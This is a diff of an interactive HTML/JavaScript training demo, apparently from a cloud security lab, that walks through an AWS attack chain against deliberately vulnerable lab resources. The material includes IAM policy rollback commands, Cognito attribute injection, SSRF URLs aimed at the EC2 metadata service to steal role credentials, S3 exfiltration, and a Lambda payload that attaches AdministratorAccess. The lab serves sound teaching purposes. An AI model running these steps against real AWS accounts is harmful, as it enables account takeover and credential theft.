-      <div class="option-card" onclick="selectVersion(this,'v4')" style="text-align:center;padding:12px"><div class="oc-title">v4</div><div class="oc-desc">Limited</div></div>
-      <div class="option-card" onclick="selectVersion(this,'v3')" style="text-align:center;padding:12px"><div class="oc-title">v3</div><div class="oc-desc">Read</div></div>
-      <div class="option-card" onclick="selectVersion(this,'v2')" style="text-align:center;padding:12px"><div class="oc-title">v2</div><div class="oc-desc">Minimal</div></div>
-      <div class="option-card" onclick="selectVersion(this,'v1')" style="text-align:center;padding:12px;border-color:rgba(255,71,87,0.3)"><div class="oc-title text-red">v1</div><div class="oc-desc text-red">Admin *:*</div></div>
-    </div>
-  </div>
-
-  <!-- Confirmation dialog -->
-  <div class="confirm-box danger" id="escalate-confirm">
-    <h4 class="text-red">⚠ Confirm Privilege Escalation</h4>
-    <p>You are about to set the default policy version to <strong id="selected-version-label">v1</strong>, which grants <strong>full admin access</strong>. Type <code>ESCALATE</code> to confirm.</p>
-    <div class="confirm-input-row">
-      <input class="form-input" id="escalate-confirm-input" placeholder="Type ESCALATE to confirm" autocomplete="off">
-      <button class="btn btn-primary btn-sm" id="btn-escalate-go" onclick="executeEscalation()" disabled>Execute</button>
-    </div>
-  </div>
-
-  <div class="terminal mt-20">
-    <div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">terminal — escalation</span></div>
-    <div class="terminal-body" id="terminal-escalate"></div>
-  </div>
-
-  <div class="mt-30">
-    <button class="btn btn-primary" id="btn-to-cognito" onclick="navigateTo(5)" disabled>Exploit Cognito →</button>
-  </div>
-</div>
-
-<!-- ================================================ -->
-<!-- SCREEN 5: COGNITO EXPLOIT (Phased Interactive)   -->
-<!-- ================================================ -->
-<div class="screen" id="screen-5">
-  <div class="screen-badge">Phase 3 — Cognito Bypass</div>
-  <h1 class="screen-title">Vulnerable Cognito Exploit</h1>
-  <p class="screen-subtitle">Bypass validation, inject attributes, and extract credentials — step by step.</p>
-
-  <div class="phase-tabs">
-    <div class="phase-tab active" onclick="switchCognitoPhase(1)">1 · Sign-up Bypass</div>
-    <div class="phase-tab" onclick="switchCognitoPhase(2)">2 · Attribute Injection</div>
-    <div class="phase-tab" onclick="switchCognitoPhase(3)">3 · Credential Extraction</div>
-  </div>
-
-  <div class="phase-content active" id="cog-phase-1">
-    <div class="split">
-      <div class="card">
-        <h3>Register as Attacker</h3>
-        <p class="text-muted fs-14 mb-20">The frontend has client-side only email validation. We'll bypass it using the CLI directly.</p>
-        <div class="form-group">
-          <label class="form-label">Attacker Email</label>
-          <input class="form-input" id="cog-email" type="email" placeholder="attacker@evil.com" autocomplete="off">
-        </div>
-        <div class="form-group">
-          <label class="form-label">Password</label>
-          <input class="form-input" id="cog-password" type="text" placeholder="Attack3r!Pass" autocomplete="off">
-        </div>
-        <div class="form-group">
-          <label class="form-label">Confirmation Code (simulated)</label>
-          <input class="form-input" id="cog-code" type="text" placeholder="Enter 6-digit code e.g. 482916" autocomplete="off">
-        </div>
-        <button class="btn btn-primary" onclick="executeCognitoSignup()">Sign Up & Confirm →</button>
-      </div>
-      <div>
-        <div class="terminal"><div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">terminal — cognito</span></div>
-        <div class="terminal-body" id="terminal-cog1"></div></div>
-      </div>
-    </div>
-  </div>
-
-  <div class="phase-content" id="cog-phase-2">
-    <div class="split">
-      <div class="card">
-        <h3>Inject Admin Attribute</h3>
-        <p class="text-muted fs-14 mb-20">Custom attributes are writable. Set <code>custom:access</code> to escalate.</p>
-        <div class="form-group">
-          <label class="form-label">Attribute Name</label>
-          <select class="form-select" id="cog-attr-name">
-            <option value="">Select attribute...</option>
-            <option value="custom:access">custom:access</option>
-            <option value="custom:role">custom:role</option>
-            <option value="email_verified">email_verified</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label class="form-label">Attribute Value</label>
-          <input class="form-input" id="cog-attr-value" type="text" placeholder="e.g. admin" autocomplete="off">
-        </div>
-        <button class="btn btn-primary" onclick="executeCognitoInject()">Inject Attribute →</button>
-      </div>
-      <div>
-        <div class="terminal"><div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">terminal — cognito</span></div>
-        <div class="terminal-body" id="terminal-cog2"></div></div>
-      </div>
-    </div>
-  </div>
-
-  <div class="phase-content" id="cog-phase-3">
-    <div class="split">
-      <div class="card">
-        <h3>Extract AWS Credentials</h3>
-        <p class="text-muted fs-14 mb-20">With admin attribute set, the Identity Pool grants elevated AWS credentials.</p>
-        <button class="btn btn-primary mb-20" onclick="executeCognitoExtract()">Extract Credentials →</button>
-        <div class="confirm-box success" id="cog-creds-reveal">
-          <h4 class="text-green">Temporary Credentials Obtained</h4>
-          <div class="mono fs-14 mt-12" style="color:var(--text-muted);line-height:1.8">
-            AccessKeyId: <span class="text-amber">ASIAZ3EXAMPLE7COGNITO</span><br>
-            SecretKey: <span class="text-amber">wJalr+CognitoTemp/K7MDENG</span><br>
-            Token: <span class="text-amber">IQoJb3JpZ2lu...truncated</span>
-          </div>
-        </div>
-      </div>
-      <div>
-        <div class="terminal"><div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">terminal — cognito</span></div>
-        <div class="terminal-body" id="terminal-cog3"></div></div>
-      </div>
-    </div>
-  </div>
-
-  <div class="mt-30">
-    <button class="btn btn-primary" id="btn-to-ssrf" onclick="navigateTo(6)" disabled>Attack EC2 via SSRF →</button>
-  </div>
-</div>
-
-<!-- ================================================ -->
-<!-- SCREEN 6: EC2 SSRF (Interactive URL Input)       -->
-<!-- ================================================ -->
-<div class="screen" id="screen-6">
-  <div class="screen-badge">Phase 4 — SSRF Attack Chain</div>
-  <h1 class="screen-title">EC2 SSRF → Credential Theft</h1>
-  <p class="screen-subtitle">Craft SSRF payloads step by step. Enter URLs, observe responses, and chain the attack.</p>
-
-  <div class="chain-container mb-30" id="ssrf-chain">
-    <div class="chain-node" data-idx="0"><div class="chain-icon ssrf">URL</div><div class="chain-label">SSRF Input</div></div>
-    <div class="chain-arrow">→</div>
-    <div class="chain-node" data-idx="1"><div class="chain-icon iam">169</div><div class="chain-label">Metadata Svc</div></div>
-    <div class="chain-arrow">→</div>
-    <div class="chain-node" data-idx="2"><div class="chain-icon cred">KEY</div><div class="chain-label">Stolen Creds</div></div>
-    <div class="chain-arrow">→</div>
-    <div class="chain-node" data-idx="3"><div class="chain-icon s3">S3</div><div class="chain-label">Secret Bucket</div></div>
-    <div class="chain-arrow">→</div>
-    <div class="chain-node" data-idx="4"><div class="chain-icon admin">ADM</div><div class="chain-label">Admin Access</div></div>
-  </div>
-
-  <!-- SSRF Input Bar -->
-  <div class="card mb-20" id="ssrf-input-card">
-    <div class="flex items-center gap-12">
-      <label class="form-label" style="margin:0;white-space:nowrap">SSRF URL</label>
-      <input class="form-input" id="ssrf-url-input" type="text" placeholder="http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/" style="flex:1" autocomplete="off">
-      <button class="btn btn-primary btn-sm" onclick="executeSSRF()">Send →</button>
-    </div>
-    <div class="fs-12 text-muted mt-8">Step <span id="ssrf-step-num">1</span>/4 — <span id="ssrf-step-desc">Query the metadata service root</span></div>
-  </div>
-
-  <div class="terminal">
-    <div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">terminal — ssrf-chain</span></div>
-    <div class="terminal-body" id="terminal-ssrf" style="max-height:340px"></div>
-  </div>
-
-  <div class="mt-30">
-    <button class="btn btn-primary" id="btn-to-lambda" onclick="navigateTo(7)" disabled>Escalate via Lambda →</button>
-  </div>
-</div>
-
-<!-- ================================================ -->
-<!-- SCREEN 7: LAMBDA PRIVESC (Code + Deploy)         -->
-<!-- ================================================ -->
-<div class="screen" id="screen-7">
-  <div class="screen-badge">Phase 5 — Lambda Privilege Escalation</div>
-  <h1 class="screen-title">Malicious Lambda Deployment</h1>
-  <p class="screen-subtitle">Review the payload, select the target role, deploy, and invoke.</p>
-
-  <div class="split">
-    <div>
-      <h3>Malicious Function</h3>
-      <div class="code-editor mt-20">
-        <div class="code-editor-header"><span>📄</span> lambda_escalate.py</div>
-        <div class="code-editor-body">
-<span class="kw">import</span> <span class="vr">boto3</span><br><br>
-<span class="kw">def</span> <span class="fn">lambda_handler</span>(<span class="vr">event</span>, <span class="vr">context</span>):<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">iam</span> = <span class="vr">boto3</span>.<span class="fn">client</span>(<span class="st">'iam'</span>)<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">iam</span>.<span class="fn">attach_user_policy</span>(<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">UserName</span>=<span class="st">'chris-lambda_privesc_cgid'</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">PolicyArn</span>=<span class="st">'arn:aws:iam::aws:policy/AdministratorAccess'</span><br>
-&nbsp;&nbsp;&nbsp;&nbsp;)<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="kw">return</span> <span class="st">"Policy attached"</span>
-        </div>
-      </div>
-
-      <div class="card mt-20">
-        <h3>Select Execution Role</h3>
-        <p class="text-muted fs-14 mb-12">Which role should the Lambda function assume?</p>
-        <div class="option-cards mb-20">
-          <div class="option-card" onclick="selectLambdaRole(this,'cg-lambdaManager')" style="margin-bottom:8px">
-            <div class="oc-title">cg-lambdaManager</div>
-            <div class="oc-desc">Can create and invoke Lambda functions. Cannot modify IAM directly.</div>
-          </div>
-          <div class="option-card" onclick="selectLambdaRole(this,'cg-debug')" style="margin-bottom:8px;border-color:rgba(255,71,87,0.2)">
-            <div class="flex items-center gap-12"><div class="oc-title">cg-debug</div><span class="tag tag-critical">AdminAccess</span></div>
-            <div class="oc-desc">Has AdministratorAccess policy. Only assumable by Lambda service.</div>
-          </div>
-        </div>
-        <button class="btn btn-primary" id="btn-deploy-lambda" onclick="deployLambda()" disabled>Deploy & Invoke →</button>
-      </div>
-    </div>
-    <div>
-      <div class="terminal">
-        <div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">terminal — lambda-privesc</span></div>
-        <div class="terminal-body" id="terminal-lambda"></div>
-      </div>
-      <div id="lambda-banner" class="flash-banner success mt-20">✓ AdministratorAccess attached to chris-lambda_privesc_cgid</div>
-    </div>
-  </div>
-  <div class="mt-30">
-    <button class="btn btn-primary" id="btn-to-killchain" onclick="navigateTo(8)" disabled>View Kill Chain →</button>
-  </div>
-</div>
-
-<!-- ================================================ -->
-<!-- SCREEN 8: KILL CHAIN                             -->
-<!-- ================================================ -->
-<div class="screen" id="screen-8">
-  <div class="screen-badge">Complete Attack Path</div>
-  <h1 class="screen-title">Full Kill Chain Visualization</h1>
-  <p class="screen-subtitle">From zero access to full account compromise — every step mapped.</p>
-
-  <div class="kill-chain-graph" id="kill-chain">
-    <div class="kill-phase phase-recon"><div class="kill-phase-label">Recon</div><div class="kill-phase-line"><div class="kill-phase-dot"></div></div><div class="kill-phase-content"><h4>IAM Policy Enumeration <span class="tag tag-iam" style="margin-left:8px">IAM</span></h4><p>Discover attached policies, list all 5 versions, identify v1 with unrestricted "*:*".</p></div></div>
-    <div class="kill-phase phase-exploit"><div class="kill-phase-label">Exploit</div><div class="kill-phase-line"><div class="kill-phase-dot"></div></div><div class="kill-phase-content"><h4>Policy Version Rollback <span class="tag tag-iam" style="margin-left:8px">IAM</span></h4><p>Set default policy version to v1 — instant admin escalation.</p></div></div>
-    <div class="kill-phase phase-exploit"><div class="kill-phase-label">Exploit</div><div class="kill-phase-line"><div class="kill-phase-dot"></div></div><div class="kill-phase-content"><h4>Cognito Attribute Injection <span class="tag tag-cognito" style="margin-left:8px">Cognito</span></h4><p>Bypass client-side validation, inject custom:access=admin, extract temp creds.</p></div></div>
-    <div class="kill-phase phase-escalate"><div class="kill-phase-label">Escalate</div><div class="kill-phase-line"><div class="kill-phase-dot"></div></div><div class="kill-phase-content"><h4>EC2 SSRF → Metadata Theft <span class="tag tag-ec2" style="margin-left:8px">EC2</span></h4><p>SSRF via web app → 169.254.169.254 → steal IAM role temp credentials.</p></div></div>
-    <div class="kill-phase phase-exfil"><div class="kill-phase-label">Exfiltrate</div><div class="kill-phase-line"><div class="kill-phase-dot"></div></div><div class="kill-phase-content"><h4>S3 Credential Exfiltration <span class="tag tag-s3" style="margin-left:8px">S3</span></h4><p>Download admin credentials from cg-secret-s3-bucket using stolen EC2 role.</p></div></div>
-    <div class="kill-phase phase-impact"><div class="kill-phase-label">Impact</div><div class="kill-phase-line"><div class="kill-phase-dot"></div></div><div class="kill-phase-content"><h4>Lambda Privilege Escalation <span class="tag tag-lambda" style="margin-left:8px">Lambda</span></h4><p>Deploy malicious Lambda → self-attach AdministratorAccess → full takeover.</p></div></div>
-  </div>
-  <div class="mt-30 text-center">
-    <button class="btn btn-primary" onclick="navigateTo(9)">Clean Up Resources →</button>
-  </div>
-</div>
-
-<!-- ================================================ -->
-<!-- SCREEN 9: CLOUD NUKE (Confirmation + Progress)   -->
-<!-- ================================================ -->
-<div class="screen" id="screen-9">
-  <div class="screen-badge">Cleanup</div>
-  <h1 class="screen-title">Cloud Nuke</h1>
-  <p class="screen-subtitle">Destroy all provisioned lab resources. Requires confirmation.</p>
-
-  <div class="split">
-    <div>
-      <div class="card mb-20">
-        <h3>Select Region</h3>
-        <div class="form-group mt-12">
-          <select class="form-select" id="nuke-region">
-            <option value="">Select region...</option>
-            <option value="us-east-1">us-east-1 (N. Virginia)</option>
-            <option value="us-west-2">us-west-2 (Oregon)</option>
-            <option value="eu-west-1">eu-west-1 (Ireland)</option>
-            <option value="all">All regions</option>
-          </select>
-        </div>
-      </div>
-
-      <div class="confirm-box danger" id="nuke-confirm">
-        <h4 class="text-red">⚠ Destructive Action</h4>
-        <p>This will permanently delete <strong>all resources</strong> in the selected region. Type <code>nuke</code> to confirm.</p>
-        <div class="confirm-input-row">
-          <input class="form-input" id="nuke-confirm-input" placeholder="Type nuke to confirm" autocomplete="off">
-          <button class="btn btn-primary btn-sm" id="btn-nuke-go" onclick="executeNuke()" disabled>Nuke →</button>
-        </div>
-      </div>
-    </div>
-    <div>
-      <h3>Resource Deletion Progress</h3>
-      <div class="card mt-20" id="nuke-progress">
-        <div class="nuke-item"><div class="nuke-label text-blue">IAM Users/Roles</div><div class="nuke-bar-bg"><div class="nuke-bar-fill red" id="nuke-iam"></div></div><div class="nuke-status" id="nuke-iam-status">—</div></div>
-        <div class="nuke-item"><div class="nuke-label text-red">Cognito Pools</div><div class="nuke-bar-bg"><div class="nuke-bar-fill red" id="nuke-cognito"></div></div><div class="nuke-status" id="nuke-cognito-status">—</div></div>
-        <div class="nuke-item"><div class="nuke-label text-amber">EC2 Instances</div><div class="nuke-bar-bg"><div class="nuke-bar-fill red" id="nuke-ec2"></div></div><div class="nuke-status" id="nuke-ec2-status">—</div></div>
-        <div class="nuke-item"><div class="nuke-label text-green">S3 Buckets</div><div class="nuke-bar-bg"><div class="nuke-bar-fill red" id="nuke-s3"></div></div><div class="nuke-status" id="nuke-s3-status">—</div></div>
-        <div class="nuke-item"><div class="nuke-label text-purple">Lambda Functions</div><div class="nuke-bar-bg"><div class="nuke-bar-fill red" id="nuke-lambda"></div></div><div class="nuke-status" id="nuke-lambda-status">—</div></div>
-      </div>
-      <div id="nuke-done-banner" class="flash-banner success mt-20">✓ All Resources Destroyed — Environment Clean</div>
-      <div class="terminal mt-20">
-        <div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">terminal — cloud-nuke</span></div>
-        <div class="terminal-body" id="terminal-nuke"></div>
-      </div>
-    </div>
-  </div>
-  <div class="mt-40 text-center">
-    <button class="btn btn-secondary" onclick="navigateTo(1)">↺ Restart Demo</button>
-  </div>
-</div>
-
-
-<!-- ===================================================== -->
-<!-- JAVASCRIPT                                            -->
-<!-- ===================================================== -->
+<div id="topbar"><div id="topbar-fill"></div></div>
+<div class="toast-c" id="tc"></div>
+<div class="mov" id="mov"><div class="mod" id="mod"></div></div>
+<div id="sidebar"></div>
+<div id="main"></div>
 <script>
-// =================== STATE ===================
-const S = {
-  screen: 0,
-  total: 9,
-  anims: [],
-  // Wizard
-  wizardStep: 1,
-  // CLI interactive
-  cliStep: 0,
-  cliPrompts: [
-    { prompt: 'AWS Access Key ID [None]: ', answer: 'AKIAIOSFODNN7EXAMPLE', hint: 'AKIAIOSFODNN7EXAMPLE' },
-    { prompt: 'AWS Secret Access Key [None]: ', answer: 'wJalrXUtnFEMI/K7MDENG/bPxRfi', hint: 'wJalrXUtnFEMI/K7MDENG/bPxRfi' },
-    { prompt: 'Default region name [None]: ', answer: 'us-east-1', hint: 'us-east-1' },
-    { prompt: 'Default output format [None]: ', answer: 'json', hint: 'json' },
-  ],
-  // Recon interactive
-  reconStep: 0,
-  reconCommands: [
-    { cmd: 'aws sts get-caller-identity --profile raynor', hint: 'aws sts get-caller-identity --profile raynor' },
-    { cmd: 'aws iam list-attached-user-policies --user-name raynor-iam_privesc_by_rollback', hint: 'aws iam list-attached-user-policies ...' },
-    { cmd: 'aws iam list-policy-versions --policy-arn arn:aws:iam::012345678901:policy/cg-raynor-policy', hint: 'aws iam list-policy-versions ...' },
-    { cmd: 'aws iam get-policy-version --policy-arn arn:aws:iam::012345678901:policy/cg-raynor-policy --version-id v1', hint: 'aws iam get-policy-version ... --version-id v1' },
-  ],
-  // SSRF
-  ssrfStep: 0,
-  ssrfUrls: [
-    { url: 'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/', desc: 'Query the metadata service root' },
-    { url: 'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'Discover IAM role name' },
-    { url: 'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cloud_breach_s3_cgid', desc: 'Extract IAM role credentials' },
-    { url: 'aws s3 ls --profile stolen', desc: 'List S3 buckets with stolen credentials' },
-  ],
-  selectedVersion: null,
-  selectedLambdaRole: null,
-};
+// ═══ NAV MAP ═══
+const NAV=[
+{id:'1',label:'Summary',n:'1'},
+{id:'2',label:'Introduction',n:'2'},
+{id:'3',label:'Pre-Reqs',n:'3'},
+{id:'4',label:'Setting up AWS Accounts',n:'4',ch:[{id:'4.1',label:'AWS Console Access'},{id:'4.2',label:'Create IAM User'},{id:'4.3',label:'Access Using CLI'}]},
+{id:'5',label:'Student Environment',n:'5',ch:[{id:'5.1',label:'Setup via Script'},{id:'5.2',label:'Setup via Console'},{id:'5.3',label:'Timezone Errors'}]},
+{id:'6',label:'Attack Surface Map',n:'6'},
+{id:'7',label:'AWS IAM',n:'7',ch:[{id:'7.0',label:'IAM Architecture'},{id:'7.1',label:'Misconfigurations'},{id:'7.2',label:'Rollback — Recon'},{id:'7.3',label:'Rollback — Exploit'},{id:'7.4',label:'Cognito Exploit'}]},
+{id:'8',label:'Cloud Compute',n:'8',ch:[{id:'8.0',label:'EC2 Architecture'},{id:'8.1',label:'SSRF Exploitation'}]},
+{id:'9',label:'Serverless',n:'9',ch:[{id:'9.0',label:'Lambda Architecture'},{id:'9.1',label:'Lambda Exploitation'}]},
+{id:'10',label:'Cloud-Nuke',n:'10',ch:[{id:'10.0',label:'Nuke Execution'}]},
+{id:'11',label:'Kill Chain',n:'11'}
+];
+const FLAT=[];NAV.forEach(s=>{if(s.ch)s.ch.forEach(c=>FLAT.push(c.id));else FLAT.push(s.id)});
+const PAR={};NAV.forEach(s=>{if(s.ch)s.ch.forEach(c=>PAR[c.id]=s.id)});
+const ACC={'1':{d:'none',l:'No Access',b:''},'2':{d:'none',l:'No Access',b:''},'3':{d:'none',l:'No Access',b:''},'4.1':{d:'none',l:'Setting Up',b:''},'4.2':{d:'auth',l:'Authenticated',b:'IAM user created'},'4.3':{d:'auth',l:'Authenticated',b:'CLI configured'},'5.1':{d:'auth',l:'Authenticated',b:''},'5.2':{d:'auth',l:'Authenticated',b:''},'5.3':{d:'auth',l:'Authenticated',b:''},'6':{d:'limited',l:'Read-Only IAM',b:'iam:Get*, iam:List*'},'7.0':{d:'limited',l:'Read-Only IAM',b:'iam:Get*, iam:List*\niam:SetDefaultPolicyVersion'},'7.1':{d:'limited',l:'Read-Only IAM',b:''},'7.2':{d:'limited',l:'Read-Only IAM',b:'Running recon'},'7.3':{d:'admin',l:'FULL ADMIN',b:'Action: *, Resource: *'},'7.4':{d:'admin',l:'Admin + Cognito',b:'+ Cognito temp creds'},'8.0':{d:'admin',l:'Admin + Creds',b:'Multiple credential paths'},'8.1':{d:'admin',l:'Admin + EC2 + S3',b:'Stolen EC2 role creds'},'9.0':{d:'admin',l:'Admin + EC2 + S3',b:''},'9.1':{d:'admin',l:'TOTAL TAKEOVER',b:'AdministratorAccess attached'},'10.0':{d:'clean',l:'Cleaning Up',b:''},'11':{d:'clean',l:'Neutralized',b:'All resources destroyed'}};
 
-const TITLES = ['','Dashboard','Setup','IAM Recon','Policy Rollback','Cognito','EC2 SSRF','Lambda','Kill Chain','Nuke'];
+let S={scr:null,anims:[],cliStep:0,reconStep:0,ssrfStep:0,lamRole:null};
+const $=id=>document.getElementById(id);
+const $$=(s,p)=>(p||document).querySelectorAll(s);
+const dly=ms=>new Promise(r=>{const id=setTimeout(r,ms);S.anims.push(id)});
+const clr=()=>{S.anims.forEach(id=>clearTimeout(id));S.anims=[]};
+const sj=o=>JSON.stringify(o,null,2).split('\n').map(l=>{let s=l.replace(/ /g,'&nbsp;');s=s.replace(/"([^"]+)":/g,'<span class="jk">"$1"</span>:');s=s.replace(/: "([^"]+)"/g,': <span class="js">"$1"</span>');s=s.replace(/: (\d+)/g,': <span class="jn">$1</span>');s=s.replace(/: (true|false|null)/g,': <span class="jb">$1</span>');return s}).join('<br>');
+function aL(tid,t,c){const b=$(tid);if(!b)return;const d=document.createElement('div');d.className=`tl ${c||'out'}`;d.innerHTML=t;b.appendChild(d);b.scrollTop=b.scrollHeight;return d}
+async function tL(tid,t,c,sp){sp=sp||12;const b=$(tid);const d=document.createElement('div');d.className=`tl ${c||'out'}`;b.appendChild(d);for(let i=0;i<t.length;i++){d.innerHTML=t.substring(0,i+1);b.scrollTop=b.scrollHeight;await dly(sp)}return d}
+function aP(tid,ps,ph,cb,hint){const b=$(tid);const r=document.createElement('div');r.className='tp';r.innerHTML=`<span class="ps">${ps}</span>`;const inp=document.createElement('input');inp.className='tpi';inp.placeholder=ph||'';inp.autocomplete='off';inp.spellcheck=false;r.appendChild(inp);b.appendChild(r);b.scrollTop=b.scrollHeight;inp.focus();inp.addEventListener('keydown',function h(e){if(e.key==='Enter'){e.preventDefault();const v=inp.value.trim()||hint||'';inp.value=v;inp.disabled=true;inp.removeEventListener('keydown',h);if(cb)cb(v)}});return inp}
+function toast(m,t){const e=document.createElement('div');e.className=`toast ${t||'info'}`;e.textContent=m;$('tc').appendChild(e);setTimeout(()=>e.remove(),4000)}
+function modal(t,b,f){$('mod').innerHTML=`<div class="mod-h"><h2>${t}</h2><button class="mod-x" onclick="cModal()">✕</button></div><div class="mod-b">${b}</div>${f?`<div class="mod-f">${f}</div>`:''}`;$('mov').classList.add('vis')}
+function cModal(){$('mov').classList.remove('vis')}
 
-// =================== HELPERS ===================
-function $(id) { return document.getElementById(id); }
-function $$(sel) { return document.querySelectorAll(sel); }
-function delay(ms) { return new Promise(r => { const id = setTimeout(r, ms); S.anims.push(id); }); }
-function clearAnims() { S.anims.forEach(id => clearTimeout(id)); S.anims = []; }
-
-function syntaxJSON(obj) {
-  return JSON.stringify(obj, null, 2).split('\n').map(l => {
-    let s = l.replace(/ /g, '&nbsp;');
-    s = s.replace(/"([^"]+)":/g, '<span class="jk">"$1"</span>:');
-    s = s.replace(/: "([^"]+)"/g, ': <span class="js">"$1"</span>');
-    s = s.replace(/: (\d+)/g, ': <span class="jn">$1</span>');
-    s = s.replace(/: (true|false|null)/g, ': <span class="jb">$1</span>');
-    return s;
-  }).join('<br>');
-}
-
-function addLine(termId, text, type, instant) {
-  const body = $(termId);
-  if (!body) return;
-  const div = document.createElement('div');
-  div.className = `terminal-line ${type || 'output'}`;
-  div.innerHTML = text;
-  body.appendChild(div);
-  body.scrollTop = body.scrollHeight;
-  return div;
-}
-
-async function typeLine(termId, text, type, speed) {
-  speed = speed || 15;
-  const body = $(termId);
-  const div = document.createElement('div');
-  div.className = `terminal-line ${type || 'output'}`;
-  body.appendChild(div);
-  for (let i = 0; i < text.length; i++) {
-    div.innerHTML = text.substring(0, i + 1);
-    body.scrollTop = body.scrollHeight;
-    await delay(speed);
-  }
-  return div;
-}
-
-function addPromptInput(termId, promptText, placeholder, onSubmit, hint) {
-  const body = $(termId);
-  const row = document.createElement('div');
-  row.className = 'terminal-prompt';
-  row.innerHTML = `<span class="prompt-symbol">${promptText}</span>`;
-  const input = document.createElement('input');
-  input.className = 'terminal-prompt-input';
-  input.placeholder = placeholder || '';
-  input.autocomplete = 'off';
-  input.spellcheck = false;
-  row.appendChild(input);
-  body.appendChild(row);
-  body.scrollTop = body.scrollHeight;
-  input.focus();
-  input.addEventListener('keydown', function handler(e) {
-    if (e.key === 'Enter') {
-      e.preventDefault();
-      const val = input.value.trim() || hint || '';
-      input.value = val;
-      input.disabled = true;
-      input.removeEventListener('keydown', handler);
-      if (onSubmit) onSubmit(val);
-    }
+// ═══ SIDEBAR ═══
+function buildSB(){
+  let h=`<div class="sb-brand"><div class="sb-brand-icon">CV</div><div class="sb-brand-text">Cloud Village Labs<span>RSA Conference</span></div></div>`;
+  h+=`<div class="sb-access"><div class="sb-access-label">Access Level</div><div class="sb-access-level"><span class="adot none" id="adot"></span><span id="alvl">No Access</span></div><div class="sb-access-body" id="abdy"></div></div>`;
+  h+=`<div class="sb-nav">`;
+  NAV.forEach(s=>{
+    const has=s.ch&&s.ch.length;
+    h+=`<div class="sb-sec"><div class="sb-hdr" data-sid="${s.id}" onclick="${has?`tglSec('${s.id}')`:`nav('${s.id}')`}">`;
+    if(s.n)h+=`<span class="num">${s.n}</span>`;
+    h+=`<span>${s.label}</span>`;if(has)h+=`<span class="chv">▸</span>`;
+    h+=`</div>`;
+    if(has){h+=`<div class="sb-ch" data-sch="${s.id}">`;s.ch.forEach(c=>{h+=`<div class="sb-child" data-sid="${c.id}" onclick="nav('${c.id}')">${c.label}</div>`});h+=`</div>`}
+    h+=`</div>`;
   });
-  return input;
+  h+=`</div>`;
+  $('sidebar').innerHTML=h;
 }
-
-function toast(msg, type) {
-  const t = document.createElement('div');
-  t.className = `toast ${type || 'info'}`;
-  t.textContent = msg;
-  $('toast-container').appendChild(t);
-  setTimeout(() => t.remove(), 4000);
+function tglSec(id){
+  const ch=document.querySelector(`[data-sch="${id}"]`);
+  const hdr=document.querySelector(`.sb-hdr[data-sid="${id}"]`);
+  if(ch){ch.classList.toggle('open');hdr.classList.toggle('open')}
+  const sec=NAV.find(s=>s.id===id);
+  if(sec&&sec.ch)nav(sec.ch[0].id);
 }
-
-function showModal(title, bodyHTML, buttons) {
-  const m = $('modal-content');
-  m.innerHTML = `
-    <div class="modal-header"><h2>${title}</h2><button class="modal-close" onclick="closeModal()">✕</button></div>
-    <div class="modal-body">${bodyHTML}</div>
-    ${buttons ? `<div class="modal-footer">${buttons}</div>` : ''}
-  `;
-  $('modal-overlay').classList.add('visible');
-}
-function closeModal() { $('modal-overlay').classList.remove('visible'); }
-
-function toggleSwitch(el) { el.classList.toggle('active'); }
-
-// =================== PROGRESS ===================
-function buildProgress() {
-  let h = '';
-  for (let i = 1; i <= S.total; i++) {
-    h += `<div class="progress-step" data-screen="${i}" onclick="navigateTo(${i})"><div class="progress-dot">${i}<span class="progress-label">${TITLES[i]}</span></div></div>`;
-    if (i < S.total) h += `<div class="progress-line" id="pline-${i}"></div>`;
+function updSB(sid){
+  $$('.sb-hdr').forEach(h=>h.classList.remove('active'));
+  $$('.sb-child').forEach(c=>c.classList.remove('active'));
+  const el=document.querySelector(`.sb-child[data-sid="${sid}"]`)||document.querySelector(`.sb-hdr[data-sid="${sid}"]`);
+  if(el)el.classList.add('active');
+  const pid=PAR[sid];
+  if(pid){
+    const hdr=document.querySelector(`.sb-hdr[data-sid="${pid}"]`);
+    if(hdr){hdr.classList.add('active');hdr.classList.add('open')}
+    const ch=document.querySelector(`[data-sch="${pid}"]`);
+    if(ch)ch.classList.add('open');
   }
-  $('progress-bar').innerHTML = h;
-}
-function updateProgress(n) {
-  for (let i = 1; i <= S.total; i++) {
-    const s = document.querySelector(`.progress-step[data-screen="${i}"]`);
-    s.classList.remove('completed','active');
-    if (i < n) s.classList.add('completed');
-    else if (i === n) s.classList.add('active');
-  }
-  for (let i = 1; i < S.total; i++) $(`pline-${i}`).classList.toggle('filled', i < n);
+  const a=ACC[sid]||ACC['1'];
+  $('adot').className=`adot ${a.d}`;$('alvl').textContent=a.l;$('abdy').textContent=a.b;
 }
 
-// =================== NAVIGATION ===================
-function navigateTo(n) {
-  if (n < 1 || n > S.total || n === S.screen) return;
-  clearAnims();
-  const old = $(`screen-${S.screen}`);
-  const nw = $(`screen-${n}`);
-  if (old) old.classList.add('exit');
-  setTimeout(() => {
-    if (old) old.classList.remove('active','exit');
-    nw.classList.add('active');
-    S.screen = n;
-    updateProgress(n);
-    initScreen(n);
-  }, old ? 200 : 0);
